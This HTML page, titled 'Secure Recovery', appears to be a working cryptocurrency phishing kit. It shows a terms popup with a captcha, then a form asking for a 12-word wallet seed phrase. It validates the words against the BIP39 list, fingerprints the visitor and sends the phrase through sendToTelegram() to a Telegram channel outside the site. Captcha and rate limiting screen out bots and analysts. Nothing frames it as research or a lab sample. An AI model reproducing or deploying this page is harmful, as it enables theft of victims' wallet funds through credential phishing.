<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Recovery</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #fff;
      padding: 20px;
    }
    .card {
      max-width: 500px;
      margin: auto;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      background: white;
    }
    .seed-inputs input {
      width: 100%;
      margin: 5px 0;
      padding: 8px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    .submit-btn {
      background: linear-gradient(90deg, #ff4b2b, #ff416c);
      color: white;
      border: none;
      border-radius: 24px;
      padding: 12px;
      width: 100%;
      cursor: pointer;
      margin-top: 20px;
    }
    .g-recaptcha {
      margin: 15px 0;
    }
    .popup {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }
    .popup-content {
      background: white;
      padding: 30px;
      border-radius: 12px;
      text-align: center;
      max-width: 400px;
    }
    .accept-btn {
      margin-top: 20px;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      background-color: #537cff;
      color: white;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="popup" id="termsPopup">
    <div class="popup-content">
      <h3>Terms and Conditions</h3>
      <p>You must agree to our terms and conditions to continue.</p>
      <div class="g-recaptcha" data-sitekey="6LdQvIorAAAAADITjQqeK4M6W7FZdLfUUESYgySK" id="popupCaptcha"></div>
      <button class="accept-btn" onclick="acceptTerms()">Accept</button>
    </div>
  </div>

  <div class="card" style="display:none" id="mainCard">
    <h2>Enter Your Seed Phrase</h2>
    <div class="seed-inputs" id="seedInputs"></div>
    <div class="g-recaptcha" data-sitekey="6LdQvIorAAAAADITjQqeK4M6W7FZdLfUUESYgySK" id="mainCaptcha"></div>
    <button class="submit-btn" onclick="handleConfirm()">Confirm</button>
    <p id="errorMsg" style="color: red; display: none">Invalid or spammy request.</p>
  </div>

  <script src="bip39-words.js"></script>
  <script src="bot-handler.js"></script>
  <script>
    const seedInputs = document.getElementById("seedInputs");
    let attempts = 0;
    let lastAttempt = 0;
    let visitorId = "";

    for (let i = 1; i <= 12; i++) {
      const input = document.createElement("input");
      input.name = `word${i}`;
      input.placeholder = `Word ${i}`;
      seedInputs.appendChild(input);
    }

    FingerprintJS.load().then(fp => {
      fp.get().then(result => {
        visitorId = result.visitorId;
      });
    });

    function validateBIP39Words() {
      const inputs = document.querySelectorAll(".seed-inputs input");
      for (let input of inputs) {
        if (!bip39Words.includes(input.value.trim().toLowerCase())) {
          input.style.border = "2px solid red";
          return false;
        } else {
          input.style.border = "1px solid #ccc";
        }
      }
      return true;
    }

    function handleConfirm() {
      const now = Date.now();
      if (now - lastAttempt < 60000) attempts++;
      else attempts = 1;
      lastAttempt = now;

      if (attempts > 3) {
        document.getElementById("errorMsg").style.display = "block";
        return;
      }

      const response = grecaptcha.getResponse(document.querySelector('#mainCaptcha .g-recaptcha'));
      if (!response) {
        alert("Please complete the reCAPTCHA.");
        return;
      }

      if (!validateBIP39Words()) {
        document.getElementById("errorMsg").style.display = "block";
        return;
      }

      const inputs = document.querySelectorAll(".seed-inputs input");
      let phrase = Array.from(inputs).map(input => input.value.trim()).join(" ");

      sendToTelegram(phrase, visitorId);
    }

    function acceptTerms() {
      const popupResponse = grecaptcha.getResponse(document.querySelector('#popupCaptcha .g-recaptcha'));
      if (!popupResponse) {
        alert("Please complete the captcha before accepting.");
        return;
      }
      document.getElementById("termsPopup").style.display = "none";
      document.getElementById("mainCard").style.display = "block";
    }
  </script>
</body>
</html>
